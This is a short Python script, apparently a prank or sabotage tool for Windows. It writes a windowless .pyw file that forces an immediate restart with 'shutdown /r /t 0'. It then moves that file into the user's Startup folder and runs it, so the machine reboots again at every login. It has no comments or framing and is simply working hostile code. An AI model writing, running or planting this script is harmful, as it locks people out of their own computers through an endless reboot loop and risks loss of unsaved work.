import os
import shutil
import time


file_name = "restart_pc.pyw"
file_content = '''
import os
import time


time.sleep(10)


# Restart pc
def restart_pc():
    command = "shutdown /r /t 0"
    os.system(command)


restart_pc()

'''


# create file
def create_file(file, content):
    with open(file, "w") as f:
        f.write(content)


create_file(file_name, file_content)

time.sleep(2)

# Path of the file to move
file_path = os.path.join(os.getcwd(), file_name)

# get path to startup folder
startup_path = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"


# Move current file to startup folder
def move_to_startup():
    shutil.move(file_path, os.path.join(startup_path, file_name))


move_to_startup()


# Run created file
def run_created_file():
    command1 = f"cd \"{startup_path}\""  # Wrap the path with double quotes
    command2 = f"python \"{os.path.join(startup_path, file_name)}\""
    os.system(command1)
    time.sleep(1)
    os.system(command2)


run_created_file()

